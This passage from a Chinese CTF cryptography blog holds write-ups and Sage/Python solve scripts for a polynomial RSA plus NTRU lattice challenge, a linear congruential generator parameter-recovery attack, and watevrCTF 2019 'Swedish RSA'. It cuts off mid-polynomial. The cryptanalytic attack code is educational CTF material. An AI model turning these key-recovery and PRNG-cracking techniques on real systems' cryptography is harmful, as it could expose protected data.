41096*x^5 + 45735*x^4 + 53022*x^3 + 35475*x^2 + 47521*x + 27544n = 31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857N = 25081*x^175 + 8744*x^174 + 9823*x^173 + 9037*x^172 + 6343*x^171 + 42205*x^170 + 28573*x^169 + 55714*x^168 + 17287*x^167 + 11229*x^166 + 42630*x^165 + 64363*x^164 + 50759*x^163 + 3368*x^162 + 20900*x^161 + 55947*x^160 + 7082*x^159 + 23171*x^158 + 48510*x^157 + 20013*x^156 + 16798*x^155 + 60438*x^154 + 58779*x^153 + 9289*x^152 + 10623*x^151 + 1085*x^150 + 23473*x^149 + 13795*x^148 + 2071*x^147 + 31515*x^146 + 42832*x^145 + 38152*x^144 + 37559*x^143 + 47653*x^142 + 37371*x^141 + 39128*x^140 + 48750*x^139 + 16638*x^138 + 60320*x^137 + 56224*x^136 + 41870*x^135 + 63961*x^134 + 47574*x^133 + 63954*x^132 + 9668*x^131 + 62360*x^130 + 15244*x^129 + 20599*x^128 + 28704*x^127 + 26857*x^126 + 34885*x^125 + 33107*x^124 + 17693*x^123 + 52753*x^122 + 60744*x^121 + 21305*x^120 + 63785*x^119 + 54400*x^118 + 17812*x^117 + 64549*x^116 + 20035*x^115 + 37567*x^114 + 38607*x^113 + 32783*x^112 + 24385*x^111 + 5387*x^110 + 5134*x^109 + 45893*x^108 + 58307*x^107 + 33821*x^106 + 54902*x^105 + 14236*x^104 + 58044*x^103 + 41257*x^102 + 46881*x^101 + 42834*x^100 + 1693*x^99 + 46058*x^98 + 15636*x^97 + 27111*x^96 + 3158*x^95 + 41012*x^94 + 26028*x^93 + 3576*x^92 + 37958*x^91 + 33273*x^90 + 60228*x^89 + 41229*x^88 + 11232*x^87 + 12635*x^86 + 17942*x^85 + 4*x^84 + 25397*x^83 + 63526*x^82 + 54872*x^81 + 40318*x^80 + 37498*x^79 + 52182*x^78 + 48817*x^77 + 10763*x^76 + 46542*x^75 + 36060*x^74 + 49972*x^73 + 63603*x^72 + 46506*x^71 + 44788*x^70 + 44905*x^69 + 46112*x^68 + 5297*x^67 + 26440*x^66 + 28470*x^65 + 15525*x^64 + 11566*x^63 + 15781*x^62 + 36098*x^61 + 44402*x^60 + 55331*x^59 + 61583*x^58 + 16406*x^57 + 59089*x^56 + 53161*x^55 + 43695*x^54 + 49580*x^53 + 62685*x^52 + 31447*x^51 + 26755*x^50 + 14810*x^49 + 3281*x^48 + 27371*x^47 + 53392*x^46 + 2648*x^45 + 10095*x^44 + 25977*x^43 + 22912*x^42 + 41278*x^41 + 33236*x^40 + 57792*x^39 + 7169*x^38 + 29250*x^37 + 16906*x^36 + 4436*x^35 + 2729*x^34 + 29736*x^33 + 19383*x^32 + 11921*x^31 + 26075*x^30 + 54616*x^29 + 739*x^28 + 38509*x^27 + 19118*x^26 + 20062*x^25 + 21280*x^24 + 12594*x^23 + 14974*x^22 + 27795*x^21 + 54107*x^20 + 1890*x^19 + 13410*x^18 + 5381*x^17 + 19500*x^16 + 47481*x^15 + 58488*x^14 + 26433*x^13 + 37803*x^12 + 60232*x^11 + 34772*x^10 + 1505*x^9 + 63760*x^8 + 20890*x^7 + 41533*x^6 + 16130*x^5 + 29769*x^4 + 49142*x^3 + 64184*x^2 + 55443*x + 45925''' 题解 从一道CTF题初探NTRU格密码 exp : sage-jupyter 123R.&lt;x&gt; = PolynomialRing(GF(64621))N = R(25081*x^175 + 8744*x^174 + 9823*x^173 + 9037*x^172 + 6343*x^171 + 42205*x^170 + 28573*x^169 + 55714*x^168 + 17287*x^167 + 11229*x^166 + 42630*x^165 + 64363*x^164 + 50759*x^163 + 3368*x^162 + 20900*x^161 + 55947*x^160 + 7082*x^159 + 23171*x^158 + 48510*x^157 + 20013*x^156 + 16798*x^155 + 60438*x^154 + 58779*x^153 + 9289*x^152 + 10623*x^151 + 1085*x^150 + 23473*x^149 + 13795*x^148 + 2071*x^147 + 31515*x^146 + 42832*x^145 + 38152*x^144 + 37559*x^143 + 47653*x^142 + 37371*x^141 + 39128*x^140 + 48750*x^139 + 16638*x^138 + 60320*x^137 + 56224*x^136 + 41870*x^135 + 63961*x^134 + 47574*x^133 + 63954*x^132 + 9668*x^131 + 62360*x^130 + 15244*x^129 + 20599*x^128 + 28704*x^127 + 26857*x^126 + 34885*x^125 + 33107*x^124 + 17693*x^123 + 52753*x^122 + 60744*x^121 + 21305*x^120 + 63785*x^119 + 54400*x^118 + 17812*x^117 + 64549*x^116 + 20035*x^115 + 37567*x^114 + 38607*x^113 + 32783*x^112 + 24385*x^111 + 5387*x^110 + 5134*x^109 + 45893*x^108 + 58307*x^107 + 33821*x^106 + 54902*x^105 + 14236*x^104 + 58044*x^103 + 41257*x^102 + 46881*x^101 + 42834*x^100 + 1693*x^99 + 46058*x^98 + 15636*x^97 + 27111*x^96 + 3158*x^95 + 41012*x^94 + 26028*x^93 + 3576*x^92 + 37958*x^91 + 33273*x^90 + 60228*x^89 + 41229*x^88 + 11232*x^87 + 12635*x^86 + 17942*x^85 + 4*x^84 + 25397*x^83 + 63526*x^82 + 54872*x^81 + 40318*x^80 + 37498*x^79 + 52182*x^78 + 48817*x^77 + 10763*x^76 + 46542*x^75 + 36060*x^74 + 49972*x^73 + 63603*x^72 + 46506*x^71 + 44788*x^70 + 44905*x^69 + 46112*x^68 + 5297*x^67 + 26440*x^66 + 28470*x^65 + 15525*x^64 + 11566*x^63 + 15781*x^62 + 36098*x^61 + 44402*x^60 + 55331*x^59 + 61583*x^58 + 16406*x^57 + 59089*x^56 + 53161*x^55 + 43695*x^54 + 49580*x^53 + 62685*x^52 + 31447*x^51 + 26755*x^50 + 14810*x^49 + 3281*x^48 + 27371*x^47 + 53392*x^46 + 2648*x^45 + 10095*x^44 + 25977*x^43 + 22912*x^42 + 41278*x^41 + 33236*x^40 + 57792*x^39 + 7169*x^38 + 29250*x^37 + 16906*x^36 + 4436*x^35 + 2729*x^34 + 29736*x^33 + 19383*x^32 + 11921*x^31 + 26075*x^30 + 54616*x^29 + 739*x^28 + 38509*x^27 + 19118*x^26 + 20062*x^25 + 21280*x^24 + 12594*x^23 + 14974*x^22 + 27795*x^21 + 54107*x^20 + 1890*x^19 + 13410*x^18 + 5381*x^17 + 19500*x^16 + 47481*x^15 + 58488*x^14 + 26433*x^13 + 37803*x^12 + 60232*x^11 + 34772*x^10 + 1505*x^9 + 63760*x^8 + 20890*x^7 + 41533*x^6 + 16130*x^5 + 29769*x^4 + 49142*x^3 + 64184*x^2 + 55443*x + 45925)c2 = R(19921*x^174 + 49192*x^173 + 18894*x^172 + 61121*x^171 + 50271*x^170 + 11860*x^169 + 53128*x^168 + 38658*x^167 + 14191*x^166 + 9671*x^165 + 40879*x^164 + 15187*x^163 + 33523*x^162 + 62270*x^161 + 64211*x^160 + 54518*x^159 + 50446*x^158 + 2597*x^157 + 32216*x^156 + 10500*x^155 + 63276*x^154 + 27916*x^153 + 55316*x^152 + 30898*x^151 + 43706*x^150 + 5734*x^149 + 35616*x^148 + 14288*x^147 + 18282*x^146 + 22788*x^145 + 48188*x^144 + 34176*x^143 + 55952*x^142 + 9578*x^141 + 9177*x^140 + 22083*x^139 + 14586*x^138 + 9748*x^137 + 21118*x^136 + 155*x^135 + 64224*x^134 + 18193*x^133 + 33732*x^132 + 38135*x^131 + 51992*x^130 + 8203*x^129 + 8538*x^128 + 55203*x^127 + 5003*x^126 + 2009*x^125 + 45023*x^124 + 12311*x^123 + 21428*x^122 + 24110*x^121 + 43537*x^120 + 21885*x^119 + 50212*x^118 + 40445*x^117 + 17768*x^116 + 46616*x^115 + 4771*x^114 + 20903*x^113 + 47764*x^112 + 13056*x^111 + 50837*x^110 + 22313*x^109 + 39698*x^108 + 60377*x^107 + 59357*x^106 + 24051*x^105 + 5888*x^104 + 29414*x^103 + 31726*x^102 + 4906*x^101 + 23968*x^100 + 52360*x^99 + 58063*x^98 + 706*x^97 + 31420*x^96 + 62468*x^95 + 18557*x^94 + 1498*x^93 + 17590*x^92 + 62990*x^91 + 27200*x^90 + 7052*x^89 + 39117*x^88 + 46944*x^87 + 45535*x^86 + 28092*x^85 + 1981*x^84 + 4377*x^83 + 34419*x^82 + 33754*x^81 + 2640*x^80 + 44427*x^79 + 32179*x^78 + 57721*x^77 + 9444*x^76 + 49374*x^75 + 21288*x^74 + 44098*x^73 + 57744*x^72 + 63457*x^71 + 43300*x^70 + 1508*x^69 + 13775*x^68 + 23197*x^67 + 43070*x^66 + 20751*x^65 + 47479*x^64 + 18496*x^63 + 53392*x^62 + 10387*x^61 + 2317*x^60 + 57492*x^59 + 25441*x^58 + 52532*x^57 + 27150*x^56 + 33788*x^55 + 43371*x^54 + 30972*x^53 + 39583*x^52 + 36407*x^51 + 35564*x^50 + 44564*x^49 + 1505*x^48 + 47519*x^47 + 38695*x^46 + 43107*x^45 + 1676*x^44 + 42057*x^43 + 49879*x^42 + 29083*x^41 + 42241*x^40 + 8853*x^39 + 33546*x^38 + 48954*x^37 + 30352*x^36 + 62020*x^35 + 39864*x^34 + 9519*x^33 + 24828*x^32 + 34696*x^31 + 2387*x^30 + 27413*x^29 + 55829*x^28 + 40217*x^27 + 30205*x^26 + 42328*x^25 + 6210*x^24 + 52442*x^23 + 58495*x^22 + 2014*x^21 + 26452*x^20 + 33547*x^19 + 19840*x^18 + 5995*x^17 + 16850*x^16 + 37855*x^15 + 7221*x^14 + 32200*x^13 + 8121*x^12 + 23767*x^11 + 46563*x^10 + 51673*x^9 + 19372*x^8 + 4157*x^7 + 48421*x^6 + 41096*x^5 + 45735*x^4 + 53022*x^3 + 35475*x^2 + 47521*x + 27544) 12N.factor()[0]#(x^78 + 12426*x^77 + 29706*x^76 + 14214*x^75 + 41435*x^74 + 46604*x^73 + 23893*x^72 + 10411*x^71 + 55449*x^70 + 15218*x^69 + 42907*x^68 + 47641*x^67 + 31448*x^66 + 52209*x^65 + 43302*x^64 + 16480*x^63 + 60790*x^62 + 5440*x^61 + 7131*x^60 + 47643*x^59 + 12616*x^58 + 9600*x^57 + 33867*x^56 + 59837*x^55 + 33851*x^54 + 51809*x^53 + 12147*x^52 + 50975*x^51 + 2080*x^50 + 52706*x^49 + 30987*x^48 + 42329*x^47 + 7882*x^46 + 19787*x^45 + 46963*x^44 + 4443*x^43 + 28880*x^42 + 47493*x^41 + 46039*x^40 + 51625*x^39 + 1202*x^38 + 40015*x^37 + 48373*x^36 + 28521*x^35 + 7510*x^34 + 42677*x^33 + 18248*x^32 + 19314*x^31 + 46253*x^30 + 25572*x^29 + 16620*x^28 + 40310*x^27 + 4300*x^26 + 2195*x^25 + 23169*x^24 + 16251*x^23 + 38607*x^22 + 61403*x^21 + 30009*x^20 + 46356*x^19 + 24409*x^18 + 36007*x^17 + 7388*x^16 + 62589*x^15 + 34443*x^14 + 20261*x^13 + 14591*x^12 + 21291*x^11 + 47993*x^10 + 19889*x^9 + 24951*x^8 + 38667*x^7 + 8751*x^6 + 12468*x^5 + 4382*x^4 + 50198*x^3 + 58586*x^2 + 54642*x + 36759,1) 12N.factor()[1]#(x^97 + 24614*x^96 + 57423*x^95 + 10374*x^94 + 55372*x^93 + 2939*x^92 + 56646*x^91 + 36469*x^90 + 19757*x^89 + 49884*x^88 + 41822*x^87 + 59735*x^86 + 28106*x^85 + 18673*x^84 + 39902*x^83 + 41200*x^82 + 49062*x^81 + 6220*x^80 + 22316*x^79 + 4705*x^78 + 48905*x^77 + 21240*x^76 + 50990*x^75 + 13677*x^74 + 50609*x^73 + 55229*x^72 + 61202*x^71 + 58779*x^70 + 11596*x^69 + 51148*x^68 + 22032*x^67 + 63045*x^66 + 25960*x^65 + 9533*x^64 + 35971*x^63 + 21688*x^62 + 19214*x^61 + 50614*x^60 + 4436*x^59 + 63337*x^58 + 32836*x^57 + 37300*x^56 + 22892*x^55 + 22379*x^54 + 5275*x^53 + 44347*x^52 + 61522*x^51 + 34072*x^50 + 15591*x^49 + 22103*x^48 + 53112*x^47 + 20452*x^46 + 5723*x^45 + 23865*x^44 + 52363*x^43 + 36307*x^42 + 20419*x^41 + 46717*x^40 + 28311*x^39 + 9568*x^38 + 30893*x^37 + 52854*x^36 + 62273*x^35 + 16301*x^34 + 16813*x^33 + 332*x^32 + 29510*x^31 + 35734*x^30 + 40620*x^29 + 45814*x^28 + 13617*x^27 + 32390*x^26 + 20408*x^25 + 29592*x^24 + 29371*x^23 + 38285*x^22 + 31251*x^21 + 42643*x^20 + 18278*x^19 + 59146*x^18 + 63302*x^17 + 30859*x^16 + 45479*x^15 + 28623*x^14 + 39912*x^13 + 60407*x^12 + 57226*x^11 + 19226*x^10 + 32015*x^9 + 22768*x^8 + 55340*x^7 + 40292*x^6 + 8936*x^5 + 406*x^4 + 9747*x^3 + 51631*x^2 + 5686*x + 43925,1) 1234e = 0x10001phi = (64621 ^ 97 - 1) * (64621 ^ 78 - 1)#这里见上一篇多项式RSAd = inverse_mod(e, phi) 123m = pow(c2, d, N) print(m)#88520242910362871448352317137540300262448941340486475602003226117035863930302 12345678910h = 88520242910362871448352317137540300262448941340486475602003226117035863930302p1 = 106472061241112922861460644342336453303928202010237284715354717630502168520267v1 = vector(ZZ, [1, h])v2 = vector(ZZ, [0, p1])m = matrix([v1,v2])shortest_vector = m.LLL()[0]f, g = shortest_vectorprint(f, g)#183610829622016944154542682943585488074 228679177303871981036829786447405151037 123456789from Crypto.Util.number import *g1 = 228679177303871981036829786447405151037n = 31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857for i in range(2 ^ 20): g = g1 ^^ i if GCD(n, g) == g: print(g) break#228679177303871981036829786447405216349 12345678910g = 228679177303871981036829786447405216349q = n // gphi_n = (g - 1) * (q - 1)c = 20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714d = inverse(e, phi_n)flag = pow(c,d,n)print(type(flag))print(long_to_bytes(int(flag)))#&lt;class 'sage.rings.finite_rings.integer_mod.IntegerMod_gmp'&gt;#b'DASCTF{P01yn0m141RS4_W17h_NTRU}' wiki-NTRUEncrypt 截图","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://feverhu.github.io/categories/Crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://feverhu.github.io/tags/RSA/"},{"name":"NTRU","slug":"NTRU","permalink":"https://feverhu.github.io/tags/NTRU/"}]},{"title":"解决LCG未知参数的办法","slug":"解决LCG未知参数的办法","date":"2022-09-16T03:53:58.000Z","updated":"2022-09-28T17:03:48.332Z","comments":true,"path":"2022/09/16/解决LCG未知参数的办法/","link":"","permalink":"https://feverhu.github.io/2022/09/16/%E8%A7%A3%E5%86%B3LCG%E6%9C%AA%E7%9F%A5%E5%8F%82%E6%95%B0%E7%9A%84%E5%8A%9E%E6%B3%95/","excerpt":"","text":"Dawn_whisper : LCG 1、线性同余生成方法 设是一定常数，按照递推公式 其中A称为乘数(multiplier)，B称为增量(increment)，M称为模数(modulus) LCG的生成周期理论上应该是M，但大部分情况下会小于M，如果想要追求LCG的最大周期，应符合以下几个条件： A与B都是正整数 A、B、N[0]都比M要小 B与M互质 M的所有质因数都能整除A-1 2、攻击方法 理论上知道2个值可以知道B。3个状态值可以知道A和B。7个状态值可能知道A,B,M。 example-one: 1234567891011121314151617181920212223242526272829303132333435363738394041424344class lcg_attack: # unknown B (increment) def lcgattack1(self, states, modulus, multiplier): if(len(states)&lt;2): raise Exception(\"#####Invalid lenth of states! The lenth should be 2 at least!##### - Dawn_whisper\") increment = (states[1] - states[0] * multiplier) % modulus return {'multiplier':int(multiplier), 'increment':int(increment), 'modulus':int(modulus)} # unknown A (multiplier) def lcgattack2(self, states, modulus): if(len(states)&lt;3): raise Exception(\"#####Invalid lenth of states! The lenth should be 3 at least!##### - Dawn_whisper\") multiplier = (states[2] - states[1]) * inverse(states[1] - states[0], modulus) % modulus return self.lcgattack1(states, modulus, multiplier) # unknown M (modulus) def lcgattack3(self, states): if(len(states)&lt;6): raise Exception(\"#####Invalid lenth of states! The lenth should be 6 at least!##### - Dawn_whisper\") diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return self.lcgattack2(states, modulus)'''以下是样例执行。'''test = lcg_attack()state = [150532854791355748039117763516755705063,335246949167877025932432065299887980427,186623163520020374273300614035532913241,215621842477244010690624570814660992556,220694532805562822940506614120520015819,17868778653481346517880312348382129728,160572327041397126918110376968541265339]print(test.lcgattack3(state))作者: Dawn_whisper链接: https://dawnwhisper.github.io/2021/03/04/LCG/来源: Dawn_whisper's blog著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 6个状态值也可能求出来，遇到求逆问题的可能需要变换crack_unknown_multiplier中state相减。 example-two: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#NewStar 2022 ezPRNG wp:def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[3] - states[2]) * modinv(states[2] - states[1], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) print(modulus) return crack_unknown_multiplier(states, modulus)# N[i+1] = (A*N[i]+B) % M# A,B,N均未知hints = [32579077549265101609729134002322479188058664203229584246639330306875565342934, 30627296760863751873213598737521260410801961411772904859782399797798775242121, 59045755507520598673072877669036271379314362490837080079400207813316110037822, 29714794521560972198312794885289362350476307292503308718904661896314434077717, 3378007627369454232183998646610752441039379051735310926898417029172995488622, 35893579613746468714922176435597562302206699188445795487657524606666534642489]sequence = hintsmodulus, multiplier, increment = crack_unknown_modulus(sequence)print('A = '+str(multiplier))print('B = '+str(increment))print('N = '+str(modulus))print(crack_unknown_modulus(hints))A = 6665518583654864024281280175260135044707462922029971254176205214742119570627B = 70647661941803021648890247705354664245937054339520114852905142734885854842787N = 121345174246418575181911383111384744844396268276674523949961216790284235179004e = inverse(A, N)print(GCD(A,N))print(e)flag = ((hints[0] - B) * e) % Nprint(long_to_bytes(flag))","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://feverhu.github.io/categories/Crypto/"}],"tags":[{"name":"LCG","slug":"LCG","permalink":"https://feverhu.github.io/tags/LCG/"}]},{"title":"多项式RSA","slug":"多项式RSA-NTRU","date":"2022-09-02T16:08:24.000Z","updated":"2022-12-07T02:09:39.133Z","comments":true,"path":"2022/09/03/多项式RSA-NTRU/","link":"","permalink":"https://feverhu.github.io/2022/09/03/%E5%A4%9A%E9%A1%B9%E5%BC%8FRSA-NTRU/","excerpt":"","text":"多项式RSA整数RSA加解密原理 多项式RSA推倒在上面RSA原理的基础上将多项式的代入整数进行分析。 引用：以上原理、推导 phi的问题不可约多项式的欧拉函数求法：回到欧拉函数定义本身，欧拉函数是小于或等于n的正整数中与n互素的数的数目。 再看不可约多项式p(x)，除了0，长度为n每一个多项式都与p(x)互素，因此 \\phi(g(x)) = p^n-1明文与多项式系数加密： 将明文每个字符转ascii，每一位对应一项多项式的系数。解密： 将每一位多项式系数转换为ascii，连起来就是原文。 12m = pow(c, d, N) m = \"\".join([chr(c) for c in m.list()]) 例题：[watevrCTF 2019]Swedish RSA12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849flag = bytearray(raw_input())flag = list(flag)length = len(flag)bits = 16## Prime for Finite Field.p = random_prime(2^bits-1, False, 2^(bits-1))file_out = open(\"downloads/polynomial_rsa.txt\", \"w\")file_out.write(\"Prime: \" + str(p) + \"\\n\")## Univariate Polynomial Ring in y over Finite Field of size pR.&lt;y&gt; = PolynomialRing(GF(p))## Analogous to the primes in Zdef gen_irreducable_poly(deg): while True: out = R.random_element(degree=deg) if out.is_irreducible(): return out## Polynomial \"primes\"P = gen_irreducable_poly(ZZ.random_element(length, 2*length))Q = gen_irreducable_poly(ZZ.random_element(length, 2*length))## Public exponent keye = 65537## ModulusN = P*Qfile_out.write(\"Modulus: \" + str(N) + \"\\n\")## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)S.&lt;x&gt; = R.quotient(N)## Encryptm = S(flag)c = m^efile_out.write(\"Ciphertext: \" + str(c))file_out.close()'''Prime: 43753Modulus: 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814Ciphertext: 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659''' exp.sage:1234567891011121314151617R.&lt;y&gt; = PolynomialRing(GF(43753))N = R(\"34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 